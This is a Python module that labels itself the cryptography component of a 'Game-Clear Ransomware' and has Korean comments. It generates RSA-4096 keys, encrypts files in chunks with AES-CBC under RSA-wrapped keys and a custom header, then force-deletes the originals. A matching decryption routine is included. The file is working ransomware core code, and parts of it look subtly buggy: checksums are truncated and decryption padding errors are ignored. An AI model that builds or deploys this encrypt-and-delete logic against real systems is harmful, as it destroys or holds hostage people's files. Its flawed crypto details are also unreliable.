"""
Cryptography components for the Game-Clear Ransomware
"""

import os
import struct
from pathlib import Path
from typing import Optional

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from ..core.models import KeyPair, EncryptionResult, DecryptionResult


class CryptoManager:
    """암호화 관리자"""
    
    MAGIC_NUMBER = b"GCRS"
    VERSION = 0x0001
    MAX_RSA_ENCRYPT_SIZE = 190  # RSA-4096의 최대 암호화 크기
    CHUNK_SIZE = 1024 * 1024  # 1MB 청크 크기 (대용량 파일 최적화)
    
    def __init__(self):
        self.key_storage_path = Path.home() / ".game_ransomware" / "keys"
        self.key_storage_path.mkdir(parents=True, exist_ok=True)
    
    def generate_key_pair(self) -> KeyPair:
        """RSA-4096 키 쌍 생성"""
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096
        )
        public_key = private_key.public_key()
        
        return KeyPair(
            public_key=public_key,
            private_key=private_key,
            key_size=4096
        )
    
    def save_keys(self, key_pair: KeyPair, session_id: str) -> None:
        """키 쌍 저장"""
        key_file = self.key_storage_path / f"{session_id}.pem"
        
        # 개인키 직렬화
        private_pem = key_pair.private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        # 공개키 직렬화
        public_pem = key_pair.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        # 파일에 저장
        with open(key_file, 'wb') as f:
            f.write(private_pem)
            f.write(b'\n---PUBLIC KEY---\n')
            f.write(public_pem)
        
        # 파일 권한 설정 (Unix 계열)
        if os.name != 'nt':
            os.chmod(key_file, 0o600)
    
    def load_keys(self, session_id: str) -> Optional[KeyPair]:
        """키 쌍 로드"""
        key_file = self.key_storage_path / f"{session_id}.pem"
        
        if not key_file.exists():
            return None
        
        try:
            with open(key_file, 'rb') as f:
                content = f.read()
            
            # 개인키와 공개키 분리
            parts = content.split(b'\n---PUBLIC KEY---\n')
            if len(parts) != 2:
                return None
            
            private_pem, public_pem = parts
            
            # 개인키 로드
            private_key = serialization.load_pem_private_key(
                private_pem,
                password=None
            )
            
            # 공개키 로드
            public_key = serialization.load_pem_public_key(public_pem)
            
            return KeyPair(
                public_key=public_key,
                private_key=private_key,
                key_size=4096
            )
            
        except Exception:
            return None
    
    def encrypt_file(self, file_path: Path, public_key: rsa.RSAPublicKey) -> EncryptionResult:
        """파일 암호화 (대용량 파일 최적화)"""
        try:
            # 파일 크기 확인
            file_size = file_path.stat().st_size
            
            # 암호화된 파일 경로
            encrypted_path = file_path.with_suffix(file_path.suffix + '.encrypted')
            
            # 작은 파일 (190바이트 이하): 직접 RSA 암호화
            if file_size <= self.MAX_RSA_ENCRYPT_SIZE:
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                
                import hashlib
                original_checksum = hashlib.sha256(file_data).hexdigest()
                
                encrypted_data = self._encrypt_with_rsa(file_data, public_key)
                encrypted_aes_key = b''
                
                header = self._create_header(file_path, encrypted_aes_key, original_checksum)
                
                with open(encrypted_path, 'wb') as f:
                    f.write(header)
                    f.write(encrypted_data)
            
            else:
                # 큰 파일: 청크 단위 하이브리드 암호화 (메모리 효율적)
                original_checksum = self._calculate_file_checksum(file_path)
                
                # AES 키 생성
                aes_key = os.urandom(32)  # 256비트
                iv = os.urandom(16)  # 128비트
                
                # AES 키를 RSA로 암호화
                encrypted_aes_key = self._encrypt_with_rsa(aes_key, public_key)
                
                # 헤더 생성
                header = self._create_header(file_path, encrypted_aes_key, original_checksum)
                
                # 청크 단위로 암호화 (메모리 절약)
                cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
                encryptor = cipher.encryptor()
                
                with open(file_path, 'rb') as f_in, open(encrypted_path, 'wb') as f_out:
                    # 헤더 쓰기
                    f_out.write(header)
                    # IV 쓰기
                    f_out.write(iv)
                    
                    # 청크 단위로 읽고 암호화
                    while True:
                        chunk = f_in.read(self.CHUNK_SIZE)
                        if not chunk:
                            break
                        
                        # 마지막 청크인 경우 패딩 추가
                        if len(chunk) < self.CHUNK_SIZE:
                            padding_length = 16 - (len(chunk) % 16)
                            chunk = chunk + bytes([padding_length] * padding_length)
                        elif len(chunk) % 16 != 0:
                            padding_length = 16 - (len(chunk) % 16)
                            chunk = chunk + bytes([padding_length] * padding_length)
                        
                        encrypted_chunk = encryptor.update(chunk)
                        f_out.write(encrypted_chunk)
                    
                    # 최종화
                    final_data = encryptor.finalize()
                    if final_data:
                        f_out.write(final_data)
            
            # 원본 파일 삭제 (권한 무시하고 강제 삭제 시도)
            try:
                file_path.unlink()
            except PermissionError:
                # 권한 오류 시 강제 삭제 시도
                import stat
                file_path.chmod(stat.S_IWRITE)
                file_path.unlink()
            
            return EncryptionResult(
                success=True,
                encrypted_file=encrypted_path,
                original_checksum=original_checksum,
                error=None
            )
            
        except Exception as e:
            return EncryptionResult(
                success=False,
                encrypted_file=Path(),
                original_checksum="",
                error=str(e)
            )
    
    def decrypt_file(self, file_path: Path, private_key: rsa.RSAPrivateKey) -> DecryptionResult:
        """파일 복호화 (대용량 파일 최적화)"""
        try:
            # 파일 존재 확인
            if not file_path.exists():
                return DecryptionResult(
                    success=False,
                    decrypted_file=Path(),
                    checksum_match=False,
                    error="파일이 존재하지 않습니다"
                )
            
            # 파일 크기 확인
            file_size = file_path.stat().st_size
            
            # 최소 헤더 크기 확인
            if file_size < 600:  # 헤더 최소 크기
                return DecryptionResult(
                    success=False,
                    decrypted_file=Path(),
                    checksum_match=False,
                    error="파일이 손상되었거나 암호화 파일이 아닙니다"
                )
            
            # 헤더 읽기
            with open(file_path, 'rb') as f:
                # 헤더는 최대 600바이트 정도
                header_content = f.read(1024)
            
            # 헤더 파싱
            header_info = self._parse_header(header_content)
            if not header_info:
                return DecryptionResult(
                    success=False,
                    decrypted_file=Path(),
                    checksum_match=False,
                    error="헤더 파싱 실패 - 암호화 파일이 아니거나 손상됨"
                )
            
            original_extension, encrypted_aes_key, original_checksum, data_start = header_info
            
            # 복호화된 파일 경로
            original_path = file_path.with_suffix('')
            if original_extension:
                original_path = original_path.with_suffix(original_extension)
            
            # 작은 파일: 직접 RSA 복호화
            if not encrypted_aes_key:
                with open(file_path, 'rb') as f:
                    f.seek(data_start)
                    encrypted_data = f.read()
                
                if not encrypted_data:
                    return DecryptionResult(
                        success=False,
                        decrypted_file=Path(),
                        checksum_match=False,
                        error="암호화된 데이터가 없습니다"
                    )
                
                decrypted_data = self._decrypt_with_rsa(encrypted_data, private_key)
                
                import hashlib
                decrypted_checksum = hashlib.sha256(decrypted_data).hexdigest()
                checksum_match = decrypted_checksum == original_checksum
                
                with open(original_path, 'wb') as f:
                    f.write(decrypted_data)
            
            else:
                # 큰 파일: 청크 단위 하이브리드 복호화
                # AES 키 복호화
                try:
                    aes_key = self._decrypt_with_rsa(encrypted_aes_key, private_key)
                except Exception as e:
                    return DecryptionResult(
                        success=False,
                        decrypted_file=Path(),
                        checksum_match=False,
                        error=f"AES 키 복호화 실패: {str(e)}"
                    )
                
                # 체크섬 계산을 위한 해시 객체
                import hashlib
                hash_obj = hashlib.sha256()
                
                with open(file_path, 'rb') as f_in, open(original_path, 'wb') as f_out:
                    # 데이터 시작 위치로 이동
                    f_in.seek(data_start)
                    
                    # IV 읽기
                    iv = f_in.read(16)
                    if len(iv) != 16:
                        raise ValueError("IV 읽기 실패")
                    
                    # 복호화 준비
                    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
                    decryptor = cipher.decryptor()
                    
                    # 청크 단위로 읽고 복호화
                    total_decrypted = bytearray()
                    while True:
                        chunk = f_in.read(self.CHUNK_SIZE)
                        if not chunk:
                            break
                        
                        decrypted_chunk = decryptor.update(chunk)
                        total_decrypted.extend(decrypted_chunk)
                    
                    # 최종화
                    try:
                        final_data = decryptor.finalize()
                        if final_data:
                            total_decrypted.extend(final_data)
                    except Exception as e:
                        # 패딩 오류 등 무시하고 계속 진행
                        pass
                    
                    # 패딩 제거
                    if total_decrypted:
                        try:
                            padding_length = total_decrypted[-1]
                            if 1 <= padding_length <= 16:
                                # 패딩이 올바른지 확인
                                if all(b == padding_length for b in total_decrypted[-padding_length:]):
                                    total_decrypted = total_decrypted[:-padding_length]
                        except (IndexError, ValueError):
                            # 패딩 제거 실패 시 그대로 사용
                            pass
                    
                    # 파일 쓰기 및 체크섬 계산
                    f_out.write(total_decrypted)
                    hash_obj.update(total_decrypted)
                
                decrypted_checksum = hash_obj.hexdigest()
                checksum_match = decrypted_checksum == original_checksum
            
            # 암호화된 파일 삭제 (권한 무시하고 강제 삭제 시도)
            try:
                file_path.unlink()
            except PermissionError:
                try:
                    import stat
                    file_path.chmod(stat.S_IWRITE)
                    file_path.unlink()
                except Exception:
                    # 삭제 실패해도 복호화는 성공으로 처리
                    pass
            except Exception:
                # 삭제 실패해도 복호화는 성공으로 처리
                pass
            
            return DecryptionResult(
                success=True,
                decrypted_file=original_path,
                checksum_match=checksum_match,
                error=None
            )
            
        except Exception as e:
            return DecryptionResult(
                success=False,
                decrypted_file=Path(),
                checksum_match=False,
                error=f"복호화 오류: {str(e)}"
            )
    
    def _encrypt_with_rsa(self, data: bytes, public_key: rsa.RSAPublicKey) -> bytes:
        """RSA 직접 암호화"""
        return public_key.encrypt(
            data,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    
    def _calculate_file_checksum(self, file_path: Path) -> str:
        """파일 체크섬 계산 (청크 단위로 메모리 효율적)"""
        import hashlib
        hash_obj = hashlib.sha256()
        
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(self.CHUNK_SIZE)
                if not chunk:
                    break
                hash_obj.update(chunk)
        
        return hash_obj.hexdigest()
    
    def _decrypt_with_rsa(self, encrypted_data: bytes, private_key: rsa.RSAPrivateKey) -> bytes:
        """RSA 직접 복호화"""
        return private_key.decrypt(
            encrypted_data,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    
    def _encrypt_with_hybrid(self, data: bytes, public_key: rsa.RSAPublicKey) -> tuple[bytes, bytes]:
        """하이브리드 암호화 (AES + RSA)"""
        # AES 키 생성
        aes_key = os.urandom(32)  # 256비트
        iv = os.urandom(16)  # 128비트
        
        # AES로 데이터 암호화
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        
        # 패딩 추가
        padding_length = 16 - (len(data) % 16)
        padded_data = data + bytes([padding_length] * padding_length)
        
        encrypted_data = iv + encryptor.update(padded_data) + encryptor.finalize()
        
        # AES 키를 RSA로 암호화
        encrypted_aes_key = self._encrypt_with_rsa(aes_key, public_key)
        
        return encrypted_data, encrypted_aes_key
    
    def _decrypt_with_hybrid(self, encrypted_data: bytes, encrypted_aes_key: bytes, private_key: rsa.RSAPrivateKey) -> bytes:
        """하이브리드 복호화 (AES + RSA)"""
        # AES 키 복호화
        aes_key = self._decrypt_with_rsa(encrypted_aes_key, private_key)
        
        # IV 추출
        iv = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        
        # AES로 데이터 복호화
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
        
        # 패딩 제거
        padding_length = padded_data[-1]
        return padded_data[:-padding_length]
    
    def _create_header(self, original_file: Path, encrypted_aes_key: bytes, checksum: str) -> bytes:
        """파일 헤더 생성"""
        header = bytearray()
        
        # Magic number (4 bytes)
        header.extend(self.MAGIC_NUMBER)
        
        # Version (2 bytes)
        header.extend(struct.pack('<H', self.VERSION))
        
        # Original extension
        extension = original_file.suffix.encode('utf-8')
        header.extend(struct.pack('<H', len(extension)))
        header.extend(extension)
        
        # Encrypted AES key (512 bytes for RSA-4096, padded with zeros)
        aes_key_section = encrypted_aes_key.ljust(512, b'\x00')
        header.extend(aes_key_section)
        
        # Checksum (32 bytes)
        checksum_bytes = checksum.encode('utf-8')[:32].ljust(32, b'\x00')
        header.extend(checksum_bytes)
        
        return bytes(header)
    
    def _parse_header(self, content: bytes) -> Optional[tuple[str, bytes, str, int]]:
        """헤더 파싱"""
        try:
            if len(content) < 6:
                return None
            
            # Magic number 확인
            if content[:4] != self.MAGIC_NUMBER:
                return None
            
            # Version 확인
            version = struct.unpack('<H', content[4:6])[0]
            if version != self.VERSION:
                return None
            
            offset = 6
            
            # Original extension length
            ext_length = struct.unpack('<H', content[offset:offset+2])[0]
            offset += 2
            
            # Original extension
            extension = content[offset:offset+ext_length].decode('utf-8')
            offset += ext_length
            
            # Encrypted AES key (512 bytes)
            encrypted_aes_key = content[offset:offset+512].rstrip(b'\x00')
            offset += 512
            
            # Checksum (32 bytes)
            checksum = content[offset:offset+32].rstrip(b'\x00').decode('utf-8')
            offset += 32
            
            return extension, encrypted_aes_key, checksum, offset
            
        except Exception:
            return None